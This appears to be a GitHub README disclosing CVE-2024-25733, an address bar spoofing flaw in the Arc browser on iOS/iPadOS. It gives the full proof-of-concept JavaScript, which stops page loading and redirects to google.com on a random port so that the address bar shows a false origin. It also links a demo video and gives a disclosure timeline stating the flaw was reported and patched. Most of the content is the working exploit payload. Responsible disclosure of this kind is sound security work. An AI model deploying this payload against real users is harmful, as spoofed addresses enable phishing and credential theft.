# ARC-Browser-Address-Bar-Spoofing-PoC (CVE-2024-25733)
ARC Browser Address Bar Spoofing PoC - iOS/iPadOS

## Exploit PoC (Proof of Concept)

---

```html
<script>
    function spoof() {
        setTimeout(() => {
            window.stop();
            let randomPort;
            do {
                randomPort = Math.floor(Math.random() * 1000);
            } while (randomPort === 0 || randomPort === 443);
            document.location = "https://google.com:" + randomPort + "/";
        }, 300);
    }
    spoof();
</script>
```

## DEMO

<a href="https://github.com/hackintoanetwork/ARC-Browser-Address-Bar-Spoofing-PoC/raw/main/PoC.mp4">PoC.mp4</a>
<br>
<br>


## TimeLine
 - 2024-01-25 : Vulnerability reported to The Browser Company of New York
 - 2024-01-25 : Recognized as a security vulnerability
 - 2024-02-13 : Patched in the latest release
